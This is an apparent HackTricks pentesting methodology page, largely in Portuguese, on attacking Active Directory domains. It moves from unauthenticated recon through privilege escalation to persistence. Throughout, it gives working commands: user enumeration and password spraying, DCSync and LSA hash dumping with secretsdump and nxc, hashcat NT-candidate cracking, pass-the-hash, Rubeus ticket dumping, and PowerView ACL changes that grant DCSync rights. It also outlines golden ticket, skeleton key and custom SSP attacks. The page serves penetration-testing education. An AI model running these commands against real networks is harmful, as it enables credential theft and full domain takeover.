# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** serve como uma tecnologia fundamental, permitindo que **network administrators** criem e gerenciem de forma eficiente **domains**, **users**, e **objects** dentro de uma rede. Foi projetado para escalar, facilitando a organização de um grande número de usuários em **groups** e **subgroups** gerenciáveis, enquanto controla **access rights** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domains**, **trees**, e **forests**. Um **domain** engloba uma coleção de objects, como **users** ou **devices**, que compartilham um banco de dados comum. **Trees** são grupos desses domains ligados por uma estrutura compartilhada, e uma **forest** representa a coleção de múltiplas trees, interconectadas através de **trust relationships**, formando a camada superior da estrutura organizacional. Direitos específicos de **access** e **communication** podem ser designados em cada um desses níveis.

Conceitos-chave dentro do **Active Directory** incluem:

1. **Directory** – Armazena todas as informações pertinentes aos Active Directory objects.
2. **Object** – Denota entidades dentro do directory, incluindo **users**, **groups**, ou **shared folders**.
3. **Domain** – Serve como um contêiner para directory objects, com a capacidade de múltiplos domains coexistirem dentro de uma **forest**, cada um mantendo sua própria coleção de objects.
4. **Tree** – Um agrupamento de domains que compartilham um root domain comum.
5. **Forest** – O topo da estrutura organizacional no Active Directory, composto por várias trees com **trust relationships** entre elas.

**Active Directory Domain Services (AD DS)** engloba uma variedade de serviços críticos para o gerenciamento centralizado e comunicação dentro de uma rede. Esses serviços compreendem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia interações entre **users** e **domains**, incluindo **authentication** e funcionalidades de **search**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **digital certificates** seguros.
3. **Lightweight Directory Services** – Suporta aplicações habilitadas para diretório através do **LDAP protocol**.
4. **Directory Federation Services** – Fornece capacidades de **single-sign-on** para autenticar usuários em múltiplas aplicações web durante uma única sessão.
5. **Rights Management** – Ajuda a proteger material com direitos autorais regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Crucial para a resolução de **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Escaneie a rede, encontre máquinas e portas abertas e tente **exploit vulnerabilities** ou **extract credentials** delas (por exemplo, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumerar DNS pode fornecer informações sobre servidores chave no domain como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulte a General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar mais informações sobre como fazer isso.
- **Check for null and Guest access on smb services** (isso não funcionará em versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um SMB server pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **especial atenção ao anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Coletar credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar hosts abusando do [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair usernames/nomes de documentos internos, redes sociais, serviços (principalmente web) dentro dos ambientes do domain e também dos disponíveis publicamente.
- Se você encontrar os nomes completos dos trabalhadores da empresa, você pode tentar diferentes convenções de AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Ferramentas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Veja as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando um **invalid username is requested** o servidor responderá usando o **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo que identifiquemos que o username é inválido. **Valid usernames** irão provocar ou o **TGT in a AS-REP** response ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário precisa realizar pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra a interface MS-NRPC (Netlogon) em domain controllers. O método chama a função `DsrGetDcNameEx2` após bind da interface MS-NRPC para checar se o user ou computer existe sem qualquer credencial. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se você encontrar um desses servidores na rede, você também pode realizar **user enumeration against it**. Por exemplo, você poderia usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de usernames em [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e neste ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter o **nome das pessoas que trabalham na empresa** a partir da etapa de recon que você deveria ter realizado antes. Com o nome e sobrenome você pode usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar potenciais usernames válidos.

### Knowing one or several usernames

Ok, então você já sabe que tem um username válido mas sem senhas... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tem** o atributo _DONT_REQ_PREAUTH_ você pode **solicitar uma mensagem AS_REP** para esse usuário que conterá alguns dados criptografados por uma derivação da senha do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as senhas mais **comuns** com cada um dos usuários descobertos; talvez algum usuário esteja usando uma senha fraca (tenha em mente a política de senhas!).
- Note que você também pode **spray OWA servers** para tentar obter acesso aos servidores de e-mail dos usuários.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode ser capaz de **obter** alguns hashes de desafio para crackear ao **envenenar** alguns protocolos da **rede**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o active directory você terá **mais e-mails e uma melhor compreensão da rede**. Você pode ser capaz de forçar ataques de relay NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obter acesso ao ambiente AD.

### Steal NTLM Creds

Se você puder **acessar outros PCs ou shares** com o **null ou guest user** você poderia **colocar arquivos** (como um arquivo SCF) que se de alguma forma acessados irão **disparar uma autenticação NTLM contra você** para que você possa **roubar** o **desafio NTLM** para crackeá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada NT hash que você já possui como um candidato de senha para outros formatos mais lentos cujo material de chave é derivado diretamente do NT hash. Ao invés de brute-force passphrases longas em tickets Kerberos RC4, desafios NetNTLM, ou credenciais em cache, você alimenta os NT hashes nos modos NT-candidate do Hashcat e permite que ele valide o reuso de senha sem nunca aprender o plaintext. Isso é especialmente potente após um comprometimento de domínio onde você pode colher milhares de NT hashes atuais e históricos.

Use shucking quando:

- Você tem um corpus de NT a partir de DCSync, dumps SAM/SECURITY, ou vaults de credenciais e precisa testar reuso em outros domínios/florestas.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM, ou blobs DCC/DCC2.
- Você quer provar rapidamente o reuso para passphrases longas e intrincadas e pivotar imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de criptografia cujas chaves não são o NT hash (ex.: Kerberos etype 17/18 AES). Se um domínio aplica apenas AES, você deve retornar aos modos regulares de senha.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` com history para pegar o maior conjunto possível de NT hashes (e seus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Entradas de history ampliam dramaticamente o pool de candidatos porque a Microsoft pode armazenar até 24 hashes anteriores por conta. Para mais formas de colher segredos do NTDS veja:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados SAM/SECURITY locais e logons de domínio em cache (DCC/DCC2). Deduplicate e anexe esses hashes ao mesmo arquivo `nt_candidates.txt`.
- **Track metadata** – Mantenha o username/domínio que produziu cada hash (mesmo se o wordlist contiver apenas hex). Hashes correspondentes dizem imediatamente qual principal está reutilizando uma senha assim que o Hashcat imprimir o candidato vencedor.
- Prefira candidatos da mesma floresta ou de uma floresta confiável; isso maximiza a chance de overlap quando shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Para esta fase você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tem algumas credenciais válidas ou um shell como um usuário de domínio, **você deve lembrar que as opções dadas antes ainda são opções para comprometer outros usuários**.

Antes de começar a enumeração autenticada você deve saber qual é o **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domínio**, porque você poderá começar a **Enumeração do Active Directory:**

Em relação ao [**ASREPRoast**](asreproast.md) você agora pode encontrar todo usuário vulnerável possível, e em relação ao [**Password Spraying**](password-spraying.md) você pode obter uma **lista de todos os usernames** e tentar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- Você poderia usar o [**CMD para realizar um recon básico**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar [**powershell para recon**](../basic-powershell-for-pentesters/index.html) o que será mais stealthy
- Você também pode [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta incrível para recon em um active directory é [**BloodHound**](bloodhound.md). Ela **não é muito stealthy** (dependendo dos métodos de coleta que você usar), mas **se você não se importa** com isso, você definitivamente deve experimentá-la. Encontre onde usuários podem RDP, encontre caminhos para outros grupos, etc.
- **Outras ferramentas automatizadas de enumeração AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) pois eles podem conter informações interessantes.
- Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é **AdExplorer.exe** do **SysInternal** Suite.
- Você também pode pesquisar no banco LDAP com **ldapsearch** para procurar credenciais em campos _userPassword_ & _unixUserPassword_, ou até mesmo em _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Se você está usando **Linux**, você também pode enumerar o domínio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também pode tentar ferramentas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domínio**

É muito fácil obter todos os usernames do domínio a partir do Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeration pareça pequena, esta é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda como enumerar um domínio e pratique até se sentir confortável. Durante uma avaliação, este será o momento chave para encontrar seu caminho até DA ou para decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **TGS tickets** usados por serviços vinculados a contas de usuário e quebrar sua criptografia — que é baseada nas senhas dos usuários — offline.

Mais sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Uma vez que você obteve algumas credenciais você poderia verificar se tem acesso a alguma **máquina**. Para isso, você pode usar o **CrackMapExec** para tentar conectar em vários servidores com diferentes protocolos, de acordo com seus scans de portas.

### Local Privilege Escalation

Se você comprometeu credenciais ou uma sessão como um usuário de domínio comum e você tem **acesso** com esse usuário a **qualquer máquina no domínio** você deve tentar encontrar um caminho para **escalar privilégios localmente e saquear credenciais**. Isso porque somente com privilégios de administrador local você poderá **dump hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e um [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

É muito **improvável** que você encontre **tickets** no usuário atual que te deem permissão para acessar recursos inesperados, mas você pode verificar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o active directory você terá **mais emails e uma melhor compreensão da rede**. Você pode ser capaz de forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Procure Creds em Computer Shares | SMB Shares

Agora que você tem algumas credenciais básicas deve verificar se consegue **encontrar** quaisquer **arquivos interessantes sendo compartilhados dentro do AD**. Você pode fazer isso manualmente mas é uma tarefa muito chata e repetitiva (e mais ainda se encontrar centenas de docs que precisa checar).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se você puder **acessar outros PCs ou shares** você poderia **colocar arquivos** (like a SCF file) que se de alguma forma acessados vão **trigger an NTLM authentication against you** para que você possa **steal** o **NTLM challenge** para crackeá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para as técnicas a seguir um regular domain user não é suficiente, você precisa de alguns privilégios/credenciais especiais para executar esses ataques.**

### Hash extraction

Com sorte você conseguiu **comprometer alguma conta local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se você tem o **hash** ou **password** de um **local administrator** você deve tentar **login locally** em outros **PCs** com ele.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note que isto é bastante **ruidoso** e o **LAPS** **mitigaria** isso.

### MSSQL Abuse & Trusted Links

Se um usuário tem privilégios para **acessar instâncias MSSQL**, ele pode usar isso para **executar comandos** no host MSSQL (se estiver rodando como SA), **roubar** o hash **NetNTLM** ou até realizar um **relay attack**.\
Além disso, se uma instância MSSQL for confiável (link de banco de dados) por uma instância MSSQL diferente, se o usuário tiver privilégios sobre o banco confiável, ele poderá **usar a relação de confiança para executar queries também na outra instância**. Essas trusts podem ser encadeadas e, em algum ponto, o usuário pode encontrar um banco de dados mal configurado onde consiga executar comandos.\
**Os links entre bancos de dados funcionam mesmo através de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suites de inventário e deployment de terceiros frequentemente expõem caminhos poderosos para credenciais e execução de código. Veja:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se você encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e tiver privilégios de domínio na máquina, será possível dumpar TGTs da memória de todo usuário que fizer login nessa máquina.\
Portanto, se um **Domain Admin fizer login na máquina**, você poderá extrair o TGT dele e se passar por ele usando [Pass the Ticket](pass-the-ticket.md).\
Graças ao constrained delegation você poderia até **comprometer automaticamente um Print Server** (esperançosamente será um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador está autorizado para "Constrained Delegation" ele poderá **impersonar qualquer usuário para acessar alguns serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, poderá **impersonar qualquer usuário** (inclusive domain admins) para acessar certos serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ter privilégio **WRITE** em um objeto Active Directory de um computador remoto permite alcançar execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

O usuário comprometido pode ter alguns **privilégios interessantes sobre certos objetos de domínio** que poderiam permitir que você **movimente-se lateralmente** ou **eleve privilégios**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Descobrir um **Spool service ouvindo** dentro do domínio pode ser **abusado** para **adquirir novas credenciais** e **elevar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **outros usuários** **acessam** a máquina **comprometida**, é possível **coletar credenciais da memória** e até **injetar beacons nos processos deles** para se passar por eles.\
Normalmente os usuários acessam o sistema via RDP, então aqui estão alguns ataques sobre sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

O **LAPS** fornece um sistema para gerenciar a senha do **Administrator local** em computadores ingressados no domínio, garantindo que ela seja **randomizada**, única e frequentemente **alterada**. Essas senhas são armazenadas no Active Directory e o acesso é controlado através de ACLs para usuários autorizados apenas. Com permissões suficientes para acessar essas senhas, é possível pivotar para outros computadores.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Coletar certificados** da máquina comprometida pode ser uma forma de escalar privilégios dentro do ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se **templates vulneráveis** estiverem configurados, é possível abusá-los para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Uma vez que você obtenha privilégios de **Domain Admin** ou, ainda melhor, **Enterprise Admin**, você pode **dump** o **banco de dados do domínio**: _ntds.dit_.

[**Mais informações sobre o ataque DCSync podem ser encontradas aqui**](dcsync.md).

[**Mais informações sobre como roubar o NTDS.dit podem ser encontradas aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algumas das técnicas discutidas antes podem ser usadas para persistência.\
Por exemplo, você poderia:

- Tornar usuários vulneráveis a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Tornar usuários vulneráveis a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilégios de [**DCSync**](#dcsync) a um usuário

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O ataque **Silver Ticket** cria um **TGS legítimo** para um serviço específico usando o **NTLM hash** (por exemplo, o **hash da conta de máquina**). Esse método é empregado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um ataque **Golden Ticket** envolve um atacante obtendo acesso ao **NTLM hash da conta krbtgt** em um ambiente Active Directory. Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, essenciais para autenticação na rede AD.

Depois que o atacante obtém esse hash, ele pode criar **TGTs** para qualquer conta que desejar (ataque Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

São como golden tickets forjados de uma forma que **contorna mecanismos comuns de detecção de golden tickets**.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Possuir certificados de uma conta ou ser capaz de solicitá-los** é uma ótima forma de persistir na conta do usuário (mesmo se ele mudar a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usar certificados também permite persistir com altos privilégios dentro do domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

O objeto **AdminSDHolder** no Active Directory assegura a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando um padrão de **Access Control List (ACL)** nesses grupos para prevenir mudanças não autorizadas. No entanto, essa funcionalidade pode ser explorada; se um atacante modificar a ACL do AdminSDHolder para conceder acesso total a um usuário comum, esse usuário ganha controle extenso sobre todos os grupos privilegiados. Essa medida de segurança, destinada a proteger, pode, portanto, se inverter, permitindo acesso indevido a menos que seja monitorada de perto.

[**Mais informações sobre o AdminSDHolder Group aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter privilégios admin em tal máquina, o hash do Administrator local pode ser extraído usando **mimikatz**. Em seguida, é necessária uma modificação no registro para **habilitar o uso dessa senha**, permitindo acesso remoto à conta de Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Você pode **conceder** algumas **permissões especiais** a um **usuário** sobre certos objetos do domínio que permitirão que o usuário **eleve privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Os **security descriptors** são usados para **armazenar** as **permissões** que um **objeto** possui **sobre** outro objeto. Se você puder apenas **fazer** uma **pequena alteração** no **security descriptor** de um objeto, pode obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** em memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar o seu **próprio SSP** para **capturar** em **texto claro** as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

